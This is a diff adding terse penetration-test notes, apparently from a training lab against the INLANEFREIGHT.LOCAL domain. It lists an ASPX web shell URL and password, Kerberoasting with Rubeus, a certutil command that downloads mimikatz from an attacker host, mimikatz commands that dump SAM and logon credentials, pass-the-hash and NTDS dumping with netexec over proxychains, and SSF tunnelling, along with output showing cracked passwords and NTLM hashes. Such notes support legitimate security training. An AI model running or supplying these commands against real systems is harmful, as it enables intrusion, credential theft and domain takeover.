@@ -1,0 +1,33 @@
+http://10.129.202.242/uploads/antak.aspx
+admin:My_W3bsH3ll_P@ssw0rd!
+
+
+
+
+.\Rubeus.exe kerberoast /nowrap
+svc_sql:lucky7
+certutil.exe -urlcache -f http://10.10.14.242:8000/mimikatz64_21.exe mimikatz64_21.exe
+
+
+./mimikatz64_22.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit" > file.txt
+
+./mimikatz64_21.exe "privilege::debug" "sekurlsa::LogonPasswords" "exit" > file2.txt
+
+netexec smb 10.129.202.242 -u "Administrator" -H "bdaffbfe64f1fc646a3353be1c2c3c99" --local-auth
+
+
+└─$ proxychains4 -q netexec smb 172.16.6.50 -u "svc_sql" -p "lucky7" --sam
+SMB         172.16.6.50     445    MS01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:MS01) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)
+SMB         172.16.6.50     445    MS01             [+] INLANEFREIGHT.LOCAL\svc_sql:lucky7 (Pwn3d!)
+SMB         172.16.6.50     445    MS01             [*] Dumping SAM hashes
+SMB         172.16.6.50     445    MS01             Administrator:500:aad3b435b51404eeaad3b435b51404ee:bdaffbfe64f1fc646a3353be1c2c3c99:::
+SMB         172.16.6.50     445    MS01             Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SMB         172.16.6.50     445    MS01             DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SMB         172.16.6.50     445    MS01             WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:4b4ba140ac0767077aee1958e7f78070:::
+SMB         172.16.6.50     445    MS01             [+] Added 4 SAM hashes to the database
+
+proxychains4 -q netexec smb 172.16.6.3 -u "tpetty" -p "Sup3rS3cur3D0m@inU2eR" --ntds --user "Administrator"
+
+Expand-Archive -path C:\users\administrator\desktop\ssf-win-x86_64-3.0.0.zip
+PS C:\users\administrator\desktop\ssf-win-x86_64-3.0.0\ssf-win-x86_64-3.0.0> .\ssfd.exe -p 1234
+./ssf -D 1111 -p 1234 10.129.202.242
